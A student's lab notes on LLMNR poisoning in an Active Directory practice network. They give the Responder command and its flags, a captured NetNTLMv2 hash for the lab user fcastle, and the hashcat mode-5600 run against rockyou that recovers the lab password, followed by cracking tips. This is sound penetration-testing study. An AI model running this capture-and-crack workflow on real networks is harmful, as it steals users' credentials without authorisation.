#llmnrpoisoining
#linklocalmulticastnameresolution

# LLMNR Poisoning

- Used to identify hosts when DNS failed to do so
- Previously NBT-NS
- The key flaw is that the service utilizes a user's username and NTLMv2 hash when appropriately responding to
- Previously known as MBTNS (for older networks)
- Can capture username and hash using MITM
- respond to traffic
- shared folder (LLMNR enabled)
- can attack early morning/after lunch
- enabled by default in a network
![[Pasted image 20240711192802.png]]
#ADattackllmnrcommand
Command to be executed in kali: `sudo responder  -I eth0 -dwPv`
where:
I - interface (VPN,tun0) (eth0 if network)
d- DHCP/DNS (listening to DHCP broadcast request)
w- wpad
P - ProxyAuth
v - verbose
it senses traffic and grabs the hash
We will see hash come through 
take the hash and use `hashcat` to crack it

#respondertool
If you execute `sudo responder --help`, you will get to know several options

Make sure the following (e.g http, SMB) are "ON" but by default, they must be "ON"

![[Pasted image 20240711195044.png]]

As see here, its listening DHCP events

![[Pasted image 20240711195155.png]]

- Sign In to Punisher machine using fcastle while the kali reposnder is "ON"
- Access the attacker's machine in the file explorer using `\\192.168.64.4`
- While accessing the attacker's machine using SMB, we were able to capture the hash
Image of the Punisher's machine while accessing `\\192.168.64.4`

![[Pasted image 20240711195727.png]]

Image of the kali machine while the responder is "ON". 

![[Pasted image 20240711195645.png]]

- Use hashcat to identify the module `hashcat --help | grep NTLM` or search hashcat modules online. As a result we can see that we can use 5600 module
```
┌──(root㉿kali)-[~]
└─# hashcat --help | grep NTLM
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
                                                             
```

- Now save the hash password in text file. I saved it in file hash.txt

`mousepad hash.txt`
```
FCASTLE::MARVEL:8b8bd38f3a618157:60b54f81f03369a2530df21d74b371b8:010100000000000000b7632db2d3da01fd082be6bfdf8f5c0000000002000800450054004b00500001001e00570049004e002d004f005400450055005a004d0047005000330038004c0004003400570049004e002d004f005400450055005a004d0047005000330038004c002e00450054004b0050002e004c004f00430041004c0003001400450054004b0050002e004c004f00430041004c0005001400450054004b0050002e004c004f00430041004c000700080000b7632db2d3da010600040002000000080030003000000000000000000000000030000053fcbe58317e2568dcaf02cc2c507b2e065fa9a8f5ca10f03270654504da298e0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00360034002e0034000000000000000000
```

- now run the hashcat using module 5600
```
┌──(root㉿kali)-[~]
└─# hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt       
hashcat (v6.2.6) starting

FCASTLE::MARVEL:8b8bd38f3a618157:60b54f81f03369a2530df21d74b371b8:010100000000000000b7632db2d3da01fd082be6bfdf8f5c0000000002000800450054004b00500001001e00570049004e002d004f005400450055005a004d0047005000330038004c0004003400570049004e002d004f005400450055005a004d0047005000330038004c002e00450054004b0050002e004c004f00430041004c0003001400450054004b0050002e004c004f00430041004c0005001400450054004b0050002e004c004f00430041004c000700080000b7632db2d3da010600040002000000080030003000000000000000000000000030000053fcbe58317e2568dcaf02cc2c507b2e065fa9a8f5ca10f03270654504da298e0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00360034002e0034000000000000000000:P@$$w0rd1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: FCASTLE::MARVEL:8b8bd38f3a618157:60b54f81f03369a253...000000
Time.Started.....: Thu Jul 11 17:33:40 2024 (1 sec)
Time.Estimated...: Thu Jul 11 17:33:41 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1420.5 kH/s (0.67ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2107392/14344385 (14.69%)
Rejected.........: 0/2107392 (0.00%)
Restore.Point....: 2105344/14344385 (14.68%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: PECKHAM -> Nike13

Started: Thu Jul 11 17:33:26 2024
Stopped: Thu Jul 11 17:33:42 2024

```

#hashcattricks
#rockyou 
#hascatrules
#wordlists 
#ntlm
- As seen above the password is `P@$$w0rd1` . You can rerun it with --show once you already executed it once`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show`
- You can also do `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force` if you want to rerun it.
- You can add -O to optimize the hash cracking. It makes hashcat faster `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O`
- There are better wordlist which is rockyou2021 you can use
- Run against rules and wordlists. Rule like onerule to rule them all, the script is `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r OneRule`. If NTLMv2 it may take a couple of hours depends on what you ant to crack

